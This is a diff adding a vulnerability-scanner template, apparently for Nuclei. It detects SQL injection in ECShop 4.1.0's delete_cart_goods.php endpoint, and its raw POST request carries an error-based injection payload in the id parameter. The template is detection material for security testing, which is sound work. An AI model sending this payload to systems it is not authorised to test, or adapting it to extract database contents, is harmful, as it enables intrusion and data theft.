@@ -1,0 +1,27 @@
+id: ecshop-delete-cart-goods-sqli
+info:
+  name: ECShop delete_cart_goods.php SQLi
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ECSHOP 4.1.0 contains an SQL injection vulnerability in the delete_cart_goods.php endpoint. Exploiting this vulnerability allows attackers to retrieve sensitive information from the database.
+  tags: sql-injection
+  reference:
+    - https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw
+
+http:
+  - raw:
+      - |
+        POST /delete_cart_goods.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=0||(updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1))
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+        part: body
